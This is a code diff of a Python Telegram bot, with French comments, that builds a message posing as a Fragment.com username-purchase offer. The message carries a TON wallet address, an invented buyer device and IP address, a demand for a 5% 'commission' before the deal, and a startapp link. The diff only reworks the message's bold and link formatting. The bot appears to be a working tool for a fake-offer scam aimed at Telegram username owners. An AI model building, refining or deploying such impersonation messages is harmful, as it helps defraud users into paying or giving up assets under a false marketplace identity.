@@ -65,27 +65,67 @@ def generate_fragment_message(username, ton_amount):
     # Adresse wallet
     wallet_address = "UQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XDPR"
     
-    # Message Fragment avec format MarkdownV2 (échappement des caractères spéciaux)
-    fragment_message = f"""We have received a purchase request for your username @{username} via Fragment\\.com\\. Below are the transaction details:
+    # Message Fragment avec format simple + lien markdown
+    fragment_message = f"""We have received a purchase request for your username @{username} via Fragment.com. Below are the transaction details:
 
-*• Offer Amount: 💎{price:g} \\(${price_usd:.2f} USD\\)*
-*• Commission: 💎{commission:g} \\(${commission_usd:.2f} USD\\)*
+• Offer Amount: 💎{price:g} (${price_usd:.2f} USD)
+• Commission: 💎{commission:g} (${commission_usd:.2f} USD)
 
-Please note that a 5% commission is charged to the seller prior to accepting the deal\\. This ensures a secure and efficient transaction process\\.
+Please note that a 5% commission is charged to the seller prior to accepting the deal. This ensures a secure and efficient transaction process.
 
 Additional Information:
 • Device: Safari on macOS  
-• IP Address: 103\\.56\\.72\\.245
-• Wallet: [{wallet_address}](https://tonviewer\\.com/{wallet_address})
+• IP Address: 103.56.72.245
+• Wallet: [{wallet_address}](https://tonviewer.com/{wallet_address})
 
 Important:
-*• Please proceed only if you are willing to transform your username into a collectible\\. This action is irreversible\\.*
-*• If you choose not to proceed, simply ignore this message\\.*"""
+• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
+• If you choose not to proceed, simply ignore this message."""
     
-    print(f"✅ Message généré avec format markdown complet (gras + lien)")
+    # Création des entités pour le formatage en gras (approche mixte)
+    entities = []
     
-    # Plus besoin d'entities avec le markdown
-    entities = None
+    # 1. Offer Amount en gras
+    offer_text = f"• Offer Amount: 💎{price:g} (${price_usd:.2f} USD)"
+    offer_start = fragment_message.find(offer_text)
+    if offer_start != -1:
+        entities.append(MessageEntity(
+            type=MessageEntity.BOLD,
+            offset=offer_start,
+            length=len(offer_text)
+        ))
+    
+    # 2. Commission en gras
+    commission_text = f"• Commission: 💎{commission:g} (${commission_usd:.2f} USD)"
+    commission_start = fragment_message.find(commission_text)
+    if commission_start != -1:
+        entities.append(MessageEntity(
+            type=MessageEntity.BOLD,
+            offset=commission_start,
+            length=len(commission_text)
+        ))
+    
+    # 3. Premier point Important en gras
+    important_text1 = "• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible."
+    important_start1 = fragment_message.find(important_text1)
+    if important_start1 != -1:
+        entities.append(MessageEntity(
+            type=MessageEntity.BOLD,
+            offset=important_start1,
+            length=len(important_text1)
+        ))
+    
+    # 4. Deuxième point Important en gras
+    important_text2 = "• If you choose not to proceed, simply ignore this message."
+    important_start2 = fragment_message.find(important_text2)
+    if important_start2 != -1:
+        entities.append(MessageEntity(
+            type=MessageEntity.BOLD,
+            offset=important_start2,
+            length=len(important_text2)
+        ))
+    
+    print(f"✅ Message généré avec entities pour gras + markdown pour lien")
     
     # 📱 BOUTON STARTAPP - Génère un lien t.me avec startapp
     startapp_param = f"{username}-{price:g}"
@@ -148,7 +188,8 @@ async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYP
                 description=f"💎 {ton_amount:g} TON (${current_usd_value:.2f} USD)",
                 input_message_content=InputTextMessageContent(
                     fragment_message,
-                    parse_mode='MarkdownV2',  # ✅ MARKDOWNV2 PLUS FIABLE
+                    entities=entities,  # ✅ ENTITIES POUR LE GRAS
+                    parse_mode='Markdown',  # ✅ MARKDOWN POUR LE LIEN WALLET
                     disable_web_page_preview=True
                 ),
                 reply_markup=keyboard
